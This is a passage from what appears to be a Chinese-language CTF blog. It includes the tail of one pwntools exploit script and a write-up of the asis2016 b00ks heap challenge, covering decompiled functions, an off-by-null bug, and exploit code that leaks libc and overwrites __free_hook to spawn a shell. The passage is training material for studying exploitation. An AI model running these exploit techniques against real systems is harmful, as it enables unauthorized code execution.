class="hljs-string">b&#x27;top&#x27;</span>) <span class="hljs-comment"># 1</span><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaab&#x27;</span>) <span class="hljs-comment"># 2</span><br>show(<span class="hljs-number">0</span>)<br>r.recvuntil(<span class="hljs-string">&quot;aaab&quot;</span>)<br>libcbase=u32(r.recv(<span class="hljs-number">4</span>))-<span class="hljs-number">0x7b0</span>-<span class="hljs-number">0x1b0000</span><br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">20</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment"># 3</span><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">3</span>) <span class="hljs-comment"># fast 3-&gt;0</span><br>add(<span class="hljs-number">8</span>,p32(system_addr)+<span class="hljs-string">b&#x27;;sh&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>r.interactive()<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>做题记录</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>asis2016_b00ks</title>
    <link href="/2025/07/23/asis2016-b00ks/"/>
    <url>/2025/07/23/asis2016-b00ks/</url>
    
    <content type="html"><![CDATA[<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/yyyffff/桌面/b00ks&#x27;</span><br>    <span class="hljs-attr">Arch:</span>       <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>        <span class="hljs-string">PIE</span> <span class="hljs-string">enabled</span><br></code></pre></td></tr></table></figure><h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>(有些变量名是自己改过的)</p><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *<span class="hljs-title">v3</span>;</span> <span class="hljs-comment">// rdi</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  v3 = <span class="hljs-built_in">stdin</span>;<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>);<br>  sub_A77(v3);<br>  name(v3);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v5 = menu(v3);<br>    <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">6</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">switch</span> ( v5 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        add(v3);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        delete(v3);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        edit(v3);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        view(v3);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        name(v3);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        v3 = (<span class="hljs-keyword">struct</span> _IO_FILE *)<span class="hljs-string">&quot;Wrong option&quot;</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong option&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Thanks to use our library software&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到是一个菜单的题目</p><h2 id="author"><a href="#author" class="headerlink" title="author"></a>author</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">author</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter author name: &quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)input(off_202018, <span class="hljs-number">32</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to read author_name&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>输入 author 到 off_202018，也就是 unk_202040 里面</p><h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_9F5</span><span class="hljs-params">(_BYTE *a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br><br>  <span class="hljs-keyword">if</span> ( a2 &lt;= <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)read(<span class="hljs-number">0</span>, a1, <span class="hljs-number">1uLL</span>) != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>    <span class="hljs-keyword">if</span> ( *a1 == <span class="hljs-number">0xA</span> )<br>      <span class="hljs-keyword">break</span>;<br>    ++a1;<br>    <span class="hljs-keyword">if</span> ( i == a2 )<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  *a1 = <span class="hljs-number">0</span>;                                     <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>a1 是目标地址，a2 是长度</p><p>由于循环从 0 到 a2 ，而且 i&#x3D;&#x3D;a2 判断是在最后-&gt;退出循环是 a1 会超过一个字节，*a1&#x3D;0 就会造成 off-by-null</p><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">add</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> len; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">void</span> *book_struct; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">void</span> *book_name; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">void</span> *descri; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  len = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nEnter book name size: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;len);<br>  <span class="hljs-keyword">if</span> ( len &lt; <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">goto</span> LABEL_2;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter book name (Max 32 chars): &quot;</span>);<br>  book_name = <span class="hljs-built_in">malloc</span>(len);                      <span class="hljs-comment">// 为book的名字开辟空间，但貌似没有限制大小</span><br>  <span class="hljs-keyword">if</span> ( !book_name )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;unable to allocate enough space&quot;</span>);<br>    <span class="hljs-keyword">goto</span> LABEL_17;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)input(book_name, len - <span class="hljs-number">1</span>) )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to read name&quot;</span>);<br>    <span class="hljs-keyword">goto</span> LABEL_17;<br>  &#125;<br>  len = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nEnter book description size: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;len);<br>  <span class="hljs-keyword">if</span> ( len &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>LABEL_2:<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Malformed size&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    descri = <span class="hljs-built_in">malloc</span>(len);<br>    <span class="hljs-keyword">if</span> ( descri )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter book description: &quot;</span>);<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)input(descri, len - <span class="hljs-number">1</span>) )<br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unable to read description&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v2 = sub_B24();<br>        <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">-1</span> )<br>        &#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Library is full&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          book_struct = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20u</span>LL);<br>          <span class="hljs-keyword">if</span> ( book_struct )<br>          &#123;<br>            *((_DWORD *)book_struct + <span class="hljs-number">6</span>) = len;<span class="hljs-comment">//记录长度</span><br>            *((_QWORD *)book_list + v2) = book_struct;<span class="hljs-comment">//book_list存在bss段上，用来记录堆块</span><br>            *((_QWORD *)book_struct + <span class="hljs-number">2</span>) = descri;<span class="hljs-comment">//记录des指针</span><br>            *((_QWORD *)book_struct + <span class="hljs-number">1</span>) = book_name;<span class="hljs-comment">//记录name指针</span><br>            *(_DWORD *)book_struct = ++unk_202024;<span class="hljs-comment">// id,从1开始</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>          &#125;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unable to allocate book struct&quot;</span>);<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fail to allocate memory&quot;</span>);<br>    &#125;<br>  &#125;<br>LABEL_17:<br>  <span class="hljs-keyword">if</span> ( book_name )<br>    <span class="hljs-built_in">free</span>(book_name);<br>  <span class="hljs-keyword">if</span> ( descri )<br>    <span class="hljs-built_in">free</span>(descri);<br>  <span class="hljs-keyword">if</span> ( book_struct )<br>    <span class="hljs-built_in">free</span>(book_struct);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到首先创建 name 块，输入内容（长度-1，没有 off-by-null）</p><p>然后创建 des 块，同上</p><p>最后 malloc(0x30) 作为一个结构体记录堆块的信息</p><p>比如 add(0x10,b’aaaa’,0x10,b’aaa’)</p><p><img src="/2025/07/23/asis2016-b00ks/80a8fad3649710750c65e78b3a911611.png"> </p><p>而这个 book_list 在 bss 段的位置是 0x202060，与 name 就差了 0x20，也就是32，name 的长度，所以第一次我们将 name 填满（此时也发生溢出了，不过是先溢出后写入地址，所以无所谓），然后 add，再 view，就可以打印出第一个堆块的地址</p><h2 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">delete</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h] </span><br>  i = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the book id you want to delete: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">19</span> &amp;&amp; (!*((_QWORD *)book_list + i) || **((_DWORD **)book_list + i) != v1); ++i )<span class="hljs-comment">// 遍历一整个chunk_list直到找到第一个对应的id</span><br>      ;<br>    <span class="hljs-keyword">if</span> ( i != <span class="hljs-number">20</span> )<br>    &#123;<br>      <span class="hljs-built_in">free</span>(*(<span class="hljs-type">void</span> **)(*((_QWORD *)book_list + i) + <span class="hljs-number">8LL</span>));<br>      <span class="hljs-built_in">free</span>(*(<span class="hljs-type">void</span> **)(*((_QWORD *)book_list + i) + <span class="hljs-number">16LL</span>));<br>      <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)book_list + i));<br>      *((_QWORD *)book_list + i) = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Can&#x27;t find selected book!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong id&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>delete 按照 id 来寻找对应的结构体，然后 free 掉里面两个指针并置 0</p><p>for 循环就是遍历整个 book_list 直到找到第一个对应的 id</p><h2 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 只可以更改des</span><br>__int64 <span class="hljs-title function_">edit</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the book id you want to edit: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">19</span> &amp;&amp; (!*((_QWORD *)book_list + i) || **((_DWORD **)book_list + i) != v1); ++i )<br>      ;<br>    <span class="hljs-keyword">if</span> ( i == <span class="hljs-number">20</span> )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Can&#x27;t find selected book!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter new book description: &quot;</span>);<br>      <span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)input(<br>                            *(_BYTE **)(*((_QWORD *)book_list + i) + <span class="hljs-number">16LL</span>),<br>                            *(_DWORD *)(*((_QWORD *)book_list + i) + <span class="hljs-number">24LL</span>) - <span class="hljs-number">1</span>) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unable to read new description&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong id&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样是用 for 循环按 id 寻找到结构体，然后寻找到结构体里面的 des 指针，然后修改该指针里的内容</p><h2 id="view"><a href="#view" class="headerlink" title="view"></a>view</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">view</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v0; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">19</span>; ++i )<br>  &#123;<br>    v0 = *((_QWORD *)book_list + i);<br>    <span class="hljs-keyword">if</span> ( v0 )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ID: %d\n&quot;</span>, **((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> **)book_list + i));<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Name: %s\n&quot;</span>, *(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)(*((_QWORD *)book_list + i) + <span class="hljs-number">8LL</span>));<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Description: %s\n&quot;</span>, *(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)(*((_QWORD *)book_list + i) + <span class="hljs-number">16LL</span>));<br>      LODWORD(v0) = <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Author: %s\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)off_202018);<span class="hljs-comment">// 可泄露第一个堆地址</span><br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v0;<br>&#125;<br></code></pre></td></tr></table></figure><p>遍历循环输出每个 book 的 name，des，以及作者</p><h2 id="author-1"><a href="#author-1" class="headerlink" title="author"></a>author</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">author</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter author name: &quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)input(off_202018, <span class="hljs-number">32</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to read author_name&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>一个修改 author 的函数，当我们创建一个 book 在输入 0x20 的 author 即可将第一个 book_list 的第一个指针最后一字节修改为 0x00</p><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>漏洞就在于我们可以利用 off-by-null 将第一个堆块低字节修改为 00，然后在这个0x00的地址上创建一个 fake_struct ，里面的指针我们都可以自己写，这样就可以对任意地址进行读和写了，最后可以打一个 __free_hook。至于 libc 基址，反正指针都是自己控制了，后面 free 掉再 view 就可以了</p><p>详细步骤：</p><ul><li>输入 author 后创建一个堆块，保证 book1_struct 的低字节改成0x00后的区域是我们可以写入的区域，同时 view 一次，泄露第一个堆块的地址（伪造指针的时候要用）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">r.recvuntil(<span class="hljs-string">&quot;ame: &quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x1f</span>)+<span class="hljs-string">b&#x27;B&#x27;</span>)<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;bbbb&#x27;</span>) <span class="hljs-comment"># 1 这样构造可以保证struct的地址在0x.......1..附近，覆盖掉就是0x......100，落在第二个第二个book里面，可写</span><br>view()<br>r.recvuntil(<span class="hljs-string">&quot;AAAB&quot;</span>)<br>heap_addr=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br></code></pre></td></tr></table></figure><ul><li>然后就是泄露 libc 基地址，将 fake_struct 的 name 指针改成 book2_name ，将其 des 改成 book3_struct（写 free_hook 要用到）id 写成 1，然后 delete(2) ，book2_name 里面就会是 unsortedbin 表头地址，由于 book1的已经被我们控制，此时 view() 就可以打印出 unsortedbin 表头地址，再计算即可得到一系列地址</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;to leak libabse&#x27;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;same&#x27;</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 3 </span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap0-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(heap_addr))<br><span class="hljs-comment">#pause()</span><br>edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">1</span>)+p64(heap_addr+<span class="hljs-number">0x30</span>)+p64(heap_addr+<span class="hljs-number">0x1f0</span>+<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0x80</span>))<br>name(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">32</span>)<br>delete(<span class="hljs-number">2</span>)<br>view()<br>r.recvuntil(<span class="hljs-string">&quot;Name: &quot;</span>)<br>unsortedbin=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase=unsortedbin-<span class="hljs-number">88</span>-<span class="hljs-number">0x3c4b20</span><br>free_hook=libcbase+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br></code></pre></td></tr></table></figure><ul><li>然后就是打 __free_hook，由于我们将 fake_struct 的 des 改成了book3_struct，所以用这个指针在 book3_des 指针处写入 __free_hook，然后 edit(3) 就是写在 free_hook 上了，在上面写上 system 然后 delete(3)，由于我们在 3 的 name 处写了 &#x2F;bin&#x2F;sh，而其又是最先 